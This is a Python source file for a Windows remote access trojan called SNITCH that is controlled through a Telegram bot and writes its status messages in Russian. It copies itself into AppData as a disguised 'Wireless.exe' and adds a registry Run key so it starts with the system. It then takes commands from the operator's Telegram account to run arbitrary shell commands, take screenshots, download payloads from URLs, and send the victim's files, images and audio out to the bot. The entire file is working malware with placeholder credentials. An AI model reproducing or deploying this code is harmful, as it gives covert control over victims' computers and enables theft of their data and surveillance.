import os
import urllib
import telebot
import subprocess
from time import sleep
from PIL import ImageGrab
import re
import shutil
import sys

class SNITCH:
    def __init__(self, bot):
        self.anchor()
        if self.connection_check() == True:
            self.DEVNULL = open(os.devnull, "wb") 
            self.receiving_commands()
            self.send(1, str(self.execute(6)) + "connected")
            try:
                bot.polling(none_stop=True, interval=0)
            except:
                pass

    def receiving_commands(self):
        @bot.message_handler(content_types=['text'])
        def performance(message):
            if message.from_user.username == name_id:
                command = message.text.split()
                command[0] = command[0].lower()
                second_command = message.text.lower()
                if command[0] == "cd" and len(command) > 1:
                    self.execute(1, second_command.replace("cd ", ""))    
                elif command[0] == "download" and len(command) >= 3:
                    if command[1] == "-i":
                        file_name = second_command.replace("download -i ", "")
                    elif command[1] == "-d":
                        file_name = second_command.replace("download -d ", "")
                    elif command[1] == "-a":
                        file_name = second_command.replace("download -a ", "")
                    self.execute(2, file_type=command[1], file_name=file_name)                
                elif command[0] == "upload" and len(command) == 3:
                    self.execute(3, file_name=command[1], url=command[2])
                elif command[0] == "screenshot":
                    self.execute(4)
                else:
                    self.execute(7, second_command)
            else:
                self.send(1, result="Кто то пытается со мной связаться!\nid: " + str(message.from_user.first_name) + " " + str(message.from_user.username) + " " + str(message.from_user.last_name) + "\nСообщение: " + str(message.text))

    def execute(self, act, command=None, file_type=None, file_name=None, url=None):
        if act == 1:
            try:
                os.chdir(command)
                result = subprocess.check_output("cd", shell=True, stderr=self.DEVNULL, stdin=self.DEVNULL)
            except:
                result = "Не удалось найти указанный путь: " + str(command)
            self.send(1, result=result)
        elif act == 2:
            path_file = str(os.getcwd()) + "\\" + str(file_name)
            if file_type == "-i":
                self.send(2, path=path_file)
            elif file_type == "-d":
                self.send(3, path=path_file)
            elif file_type == "-a":
                self.send(4, path=path_file)
            else:
                self.send(1, "Неправильный аргумент: " + str(command[1]))
        elif act == 3:
            try:
                urllib.request.urlretrieve(url, file_name)
                result = "Файл загружен!"
            except:
                result = "Не удалось загрузить файл" 
            self.send(1, result=result)
        elif act == 4:
            try:
                screenshot = ImageGrab.grab()
                screenshot.save(str(self.execute(5)) + "\\DataWire\\Wireless.png")   
                self.send(2, path=str(self.execute(5)) + "\\DataWire\\Wireless.png")      
            except:
                self.send(1, result="Не удалось сделать скриншот")        
        elif act == 5:
            return os.environ["appdata"]
        elif act == 6:
            command = "wmic csproduct get name"
            model = subprocess.check_output(command, shell=True, stderr=self.DEVNULL, stdin=self.DEVNULL)
            model = model.decode("UTF-8")
            model = re.findall("\w\w*", model)
            name = ""
            for i in model:
                if i != "Name":
                    name = str(name) + str(i) + " "
            return name
        elif act == 7:
            try:
                result = subprocess.check_output(command, shell=True, stderr=self.DEVNULL, stdin=self.DEVNULL)
            except:
                result = "Не удалось выполнить команду: " + str(command)
            self.send(1, result=result)

    def send(self, act, result=None, path=None):
        try:
            try:
                result = result.decode("CP866")
            except:
                result = result
            if act == 1:
                if result != "":
                    if len(str(result)) < 4000:
                        bot.send_message(chat_id, result)
                    else:
                        f = open(str(self.execute(5)) + "\\DataWire\\info.txt", "w")
                        f.write(result)
                        f.close()
                        bot.send_document(chat_id, open(str(self.execute(5)) + "\\DataWire\\info.txt", "r"))
                        f.close()     
                else:
                    bot.send_message(chat_id, "Команда выполнена")               
            elif act == 2:
                try:
                    bot.send_photo(chat_id, photo=open(str(path), "rb"))
                except:
                    self.send(1, result="Не удалось открыть картинку")
            elif act == 3:
                try:
                    f = open(path, "rb")
                    bot.send_document(chat_id, f)
                    f.close()            
                except:
                    self.send(1, "Не удалось скачать файл")
            elif act == 4:
                try:
                    bot.send_audio(chat_id, audio=open(path, "rb"))
                except:
                    self.send(1, "Не удалось скачать аудио")
        except:
            pass

    def connection_check(self):
        try:
            urllib.request.urlopen("https://google.com", timeout=5)
            return True
        except:
            return False

    def anchor(self):
        dir_path = str(self.execute(5)) + "\\DataWire"
        if not os.path.exists(dir_path):
            subprocess.call("mkdir " + str(dir_path), shell=True)
        path_file = str(self.execute(5)) + "\\DataWire\\Wireless.exe"
        if not os.path.exists(path_file):
            shutil.copyfile(sys.executable, path_file)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v DataWire /t REG_SZ /d "' + str(path_file) + '"', shell=True)
            self.send(1, "snitch закрепился к системе")

chat_id = 'your chat id'
name_id = "your id"
bot = telebot.TeleBot("BOT TOKEN")

while True:
    SNITCH(bot)
